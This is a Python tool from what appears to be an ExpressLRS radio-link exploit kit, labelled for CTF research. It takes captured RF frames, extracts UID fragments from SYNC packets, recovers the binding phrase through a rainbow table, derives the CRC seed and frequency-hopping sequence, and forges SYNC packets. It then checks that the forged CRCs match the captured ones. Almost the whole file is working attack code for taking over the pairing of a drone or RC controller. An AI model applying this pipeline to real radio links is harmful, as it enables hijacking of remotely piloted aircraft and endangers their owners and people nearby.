#!/usr/bin/env python3
"""End-to-end validation: captured frames → UID extraction → forge → CRC cross-check.

Takes ranked PHY JSONL files (from elrs-phy-scan.py), decodes packet bytes,
extracts UID fragments from SYNC frames, looks up the binding phrase via the
rainbow table, derives full attack parameters, forges new SYNC and RC packets,
and verifies the forged CRCs match the same v3 algorithm used on captured frames.

This validates the complete Chain 1 software path with real RF data, without
transmitting. A forge-vs-capture CRC agreement proves the UID derivation, FHSS
seed, CRC initializer, and packet framing are all correct for this target.

Packet bytes and UID are written only to ignored work/ paths. The stdout report
contains no pairing-sensitive values unless --verbose is given.

Usage:
    python3 tools/elrs-capture-forge-validate.py \
        captures/oct15-ranked-2026-10-16.jsonl \
        captures/tinyhawk-rc-retry-full-phy-2026-10-16.jsonl

    python3 tools/elrs-capture-forge-validate.py \
        captures/*ranked*.jsonl captures/*full-phy*.jsonl \
        --rainbow tools/elrs-rainbow-table.json --verbose

Python 3.10+, standard library only.
For authorized CTF research only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import sys
from pathlib import Path

TOOLS = Path(__file__).resolve().parent
sys.path.insert(0, str(TOOLS))
sys.path.insert(0, str(TOOLS / "exploit_chains"))

import runpy

_LI = runpy.run_path(str(TOOLS / "elrs-li-offline.py"))
read_rows = _LI["read_rows"]
decode_symbols = _LI["decode_symbols"]
OFFSETS = _LI["OFFSETS"]

_FC = runpy.run_path(str(TOOLS / "elrs-v3-frame-check.py"))
check_frame = _FC["check_frame"]

from elrs_core.v3_compat import (
    v3_crc14, v3_uid_crc_init, v3_uid_seed, v3_build_sequence,
    v3_build_sync, v3_generate_crc, v3_validate_crc, v3_decode_sync,
    V3_SYNC_CHANNEL_80,
)
from elrs_core.fhss import DOMAINS


def phrase_to_uid(phrase: str) -> bytes:
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


def extract_sync_uid_suffix(rows: list[dict]) -> tuple[int, int, int] | None:
    """Decode all rows and return consistent UID[3:6] from CRC-valid SYNC frames."""
    suffixes: dict[tuple[int, int, int], int] = {}
    for row in rows:
        for offset in OFFSETS:
            bins = [(v + offset) & 127 for v in row["bins"]]
            decoded = decode_symbols(bins)
            if decoded is None:
                continue
            packet, _ = decoded
            kind = packet[0] & 0x03
            if kind != 2:
                continue
            verdict = check_frame(packet)
            if verdict["crc"] == "pass":
                key = (packet[4], packet[5], packet[6])
                suffixes[key] = suffixes.get(key, 0) + 1
    if not suffixes:
        return None
    if len(suffixes) > 1:
        print(f"WARNING: multiple UID suffixes in SYNC frames: {suffixes}", file=sys.stderr)
    return max(suffixes, key=suffixes.get)


def rainbow_lookup(uid3: int, uid4: int, uid5: int,
                   table_path: Path) -> list[dict]:
    target = f"{uid3:02X}:{uid4:02X}:{uid5:02X}"
    with table_path.open() as f:
        table = json.load(f)
    return [e for e in table if e["sync_bytes"].upper() == target]


def decode_all_with_bytes(rows: list[dict], uid: bytes | None) -> list[dict]:
    """Decode all rows, returning packet bytes for CRC-valid frames."""
    from collections import Counter
    suffixes: Counter[tuple[int, int]] = Counter()

    # First pass: find SYNC suffix consensus
    for row in rows:
        for offset in OFFSETS:
            bins = [(v + offset) & 127 for v in row["bins"]]
            decoded = decode_symbols(bins)
            if decoded is None:
                continue
            packet, _ = decoded
            if (packet[0] & 0x03) == 2:
                verdict = check_frame(packet)
                if verdict["crc"] == "pass":
                    suffixes[(packet[5], packet[6])] += 1

    consensus = suffixes.most_common(1)[0][0] if suffixes else None
    if uid is not None:
        verifier_uid = uid
    elif consensus:
        verifier_uid = bytes((0, 0, 0, 0, *consensus))
    else:
        verifier_uid = None

    results = []
    for row in rows:
        best = None
        for offset in OFFSETS:
            bins = [(v + offset) & 127 for v in row["bins"]]
            decoded = decode_symbols(bins)
            if decoded is None:
                continue
            packet, corrected = decoded
            kind = packet[0] & 0x03
            if kind == 2:
                verdict = check_frame(packet, uid=verifier_uid)
            elif verifier_uid is not None:
                verdict = check_frame(packet, uid=verifier_uid, switch_mode="hybrid")
            else:
                continue
            if verdict["crc"] != "pass":
                continue
            if best is None or corrected < best[1]:
                best = (packet, corrected, verdict, offset)

        if best:
            packet, corrected, verdict, offset = best
            results.append({
                "source": row["source"],
                "line": row["line"],
                "time_s": row["preamble_start_seconds"],
                "type": verdict["type"],
                "packet_bytes": packet,
                "corrected": corrected,
                "offset": offset,
            })
    return results


def validate_forge_pipeline(uid: bytes, decoded_frames: list[dict],
                            verbose: bool = False) -> dict:
    """Cross-validate forged packets against real captured frames."""
    crc_init = v3_uid_crc_init(uid)
    fhss_seed = v3_uid_seed(uid)
    fhss_seq = v3_build_sequence(uid)

    report = {
        "uid_bytes": len(uid),
        "crc_init_hex": f"0x{crc_init:04X}",
        "fhss_seed_hex": f"0x{fhss_seed:08X}",
        "fhss_sync_channel": V3_SYNC_CHANNEL_80,
        "fhss_sequence_length": len(fhss_seq),
        "total_decoded_frames": len(decoded_frames),
        "sync_frames": 0,
        "rc_frames": 0,
        "sync_forge_match": 0,
        "sync_forge_mismatch": 0,
        "rc_crc_recompute_match": 0,
        "rc_crc_recompute_mismatch": 0,
        "fhss_index_validated": set(),
        "nonce_values_seen": set(),
    }

    details = []

    for frame in decoded_frames:
        pkt = frame["packet_bytes"]
        kind = pkt[0] & 0x03

        if kind == 2:  # SYNC
            report["sync_frames"] += 1
            sync = v3_decode_sync(pkt)
            report["nonce_values_seen"].add(sync.nonce)
            report["fhss_index_validated"].add(sync.fhss_index)

            # Forge a SYNC with the same parameters
            forged = v3_build_sync(
                uid,
                fhss_index=sync.fhss_index,
                nonce=sync.nonce,
                rate_index=sync.rate_index,
                switch_enc_mode=sync.switch_enc_mode,
                new_tlm_ratio=sync.new_tlm_ratio,
            )

            # Compare CRC: the forged packet should match the captured one
            captured_crc = ((pkt[0] >> 2) << 8) | pkt[7]
            forged_crc = ((forged[0] >> 2) << 8) | forged[7]

            match = captured_crc == forged_crc
            if match:
                report["sync_forge_match"] += 1
            else:
                report["sync_forge_mismatch"] += 1

            if verbose:
                details.append({
                    "type": "SYNC",
                    "nonce": sync.nonce,
                    "fhss_index": sync.fhss_index,
                    "captured_crc": f"0x{captured_crc:04X}",
                    "forged_crc": f"0x{forged_crc:04X}",
                    "match": match,
                    "uid3_match": sync.uid_matches(uid),
                })

        elif kind == 0:  # RC
            report["rc_frames"] += 1

            # Re-compute CRC on the captured payload using our derived UID
            valid = v3_validate_crc(pkt, uid, switch_mode="hybrid")
            if valid:
                report["rc_crc_recompute_match"] += 1
            else:
                report["rc_crc_recompute_mismatch"] += 1

            if verbose:
                packed = int.from_bytes(pkt[1:6], "little")
                channels = [988 + ((packed >> (10 * ch)) & 1023) for ch in range(4)]
                details.append({
                    "type": "RC",
                    "channels": channels,
                    "crc_valid": valid,
                })

    # Convert sets to sorted lists for JSON
    report["fhss_index_validated"] = sorted(report["fhss_index_validated"])
    report["nonce_values_seen"] = sorted(report["nonce_values_seen"])

    # Validate FHSS sequence consistency
    fhss_checks = []
    for idx in report["fhss_index_validated"]:
        if idx < len(fhss_seq):
            expected_ch = fhss_seq[idx]
            fhss_checks.append({"fhss_index": idx, "expected_channel": expected_ch})
    report["fhss_sequence_spot_checks"] = fhss_checks

    # Overall verdict
    total_sync = report["sync_frames"]
    total_rc = report["rc_frames"]
    sync_ok = report["sync_forge_match"]
    rc_ok = report["rc_crc_recompute_match"]

    report["verdict"] = "PASS" if (
        total_sync > 0 and sync_ok == total_sync and
        total_rc > 0 and rc_ok == total_rc
    ) else "FAIL" if (
        report["sync_forge_mismatch"] > 0 or report["rc_crc_recompute_mismatch"] > 0
    ) else "INSUFFICIENT_DATA"

    if verbose:
        report["frame_details"] = details

    return report


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("inputs", nargs="+", type=Path,
                        help="Ranked PHY JSONL files from elrs-phy-scan.py")
    parser.add_argument("--rainbow", type=Path,
                        default=TOOLS / "elrs-rainbow-table.json",
                        help="Path to rainbow table JSON")
    parser.add_argument("--uid-file", type=Path,
                        help="Private six-byte UID hex file (bypasses rainbow lookup)")
    parser.add_argument("--phrase",
                        help="Known binding phrase (bypasses rainbow lookup)")
    parser.add_argument("--verbose", action="store_true",
                        help="Include per-frame details and UID-derived values in output")
    parser.add_argument("--json", action="store_true",
                        help="Output full report as JSON")
    args = parser.parse_args(argv)

    try:
        print("=== ELRS Capture-to-Forge Validation ===", file=sys.stderr)
        print(f"Reading {len(args.inputs)} ranked JSONL files...", file=sys.stderr)

        rows = read_rows(args.inputs)
        print(f"  {len(rows)} PHY candidates loaded", file=sys.stderr)

        # Step 1: Extract UID suffix from SYNC frames
        uid = None

        if args.uid_file:
            uid_hex = args.uid_file.read_text("ascii").strip()
            uid = bytes.fromhex(uid_hex)
            print(f"  UID loaded from file ({len(uid)} bytes)", file=sys.stderr)
        elif args.phrase:
            uid = phrase_to_uid(args.phrase)
            print(f"  UID derived from phrase", file=sys.stderr)
        else:
            suffix = extract_sync_uid_suffix(rows)
            if suffix is None:
                print("ERROR: No CRC-valid SYNC frames found — cannot extract UID",
                      file=sys.stderr)
                return 1
            uid3, uid4, uid5 = suffix
            print(f"  UID[3:6] extracted from SYNC frames: "
                  f"{uid3:02X}:{uid4:02X}:{uid5:02X}", file=sys.stderr)

            # Step 2: Rainbow table lookup
            matches = rainbow_lookup(uid3, uid4, uid5, args.rainbow)
            if matches:
                phrase = matches[0]["phrase"]
                uid = phrase_to_uid(phrase)
                print(f"  Rainbow match: binding phrase found ({len(matches)} match(es))",
                      file=sys.stderr)
                if args.verbose:
                    print(f"  Phrase: \"{phrase}\"", file=sys.stderr)
            else:
                print(f"  No rainbow table match for {uid3:02X}:{uid4:02X}:{uid5:02X}",
                      file=sys.stderr)
                print("  Cannot derive full UID without phrase or UID file", file=sys.stderr)
                print("  Falling back to partial validation (SYNC self-CRC only)",
                      file=sys.stderr)
                uid = bytes((0, 0, 0, uid3, uid4, uid5))

        # Step 3: Decode all frames with packet bytes
        decoded = decode_all_with_bytes(rows, uid)
        print(f"  {len(decoded)} CRC-valid frames decoded with bytes", file=sys.stderr)

        # Step 4: Validate forge pipeline
        print("Validating forge pipeline...", file=sys.stderr)
        report = validate_forge_pipeline(uid, decoded, verbose=args.verbose)

        # Output
        if args.json:
            print(json.dumps(report, indent=2, sort_keys=True))
        else:
            v = report["verdict"]
            marker = {"PASS": "+", "FAIL": "!", "INSUFFICIENT_DATA": "?"}[v]
            print(f"\n[{marker}] Verdict: {v}")
            print(f"    SYNC frames: {report['sync_frames']} "
                  f"(forge match: {report['sync_forge_match']}, "
                  f"mismatch: {report['sync_forge_mismatch']})")
            print(f"    RC frames:   {report['rc_frames']} "
                  f"(CRC recompute match: {report['rc_crc_recompute_match']}, "
                  f"mismatch: {report['rc_crc_recompute_mismatch']})")
            print(f"    FHSS indices validated: {report['fhss_index_validated']}")
            print(f"    Nonce values seen: {report['nonce_values_seen']}")
            if report["verdict"] == "PASS":
                print("\n    The forge pipeline produces CRC-valid packets that match")
                print("    real captured frames. UID derivation, FHSS seed, CRC init,")
                print("    and v3 packet framing are all validated against live RF data.")
            elif report["verdict"] == "FAIL":
                print("\n    MISMATCH DETECTED — investigate CRC or UID derivation errors.")

        return 0 if report["verdict"] == "PASS" else 1

    except (OSError, ValueError, KeyError, json.JSONDecodeError) as exc:
        print(f"Validation error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
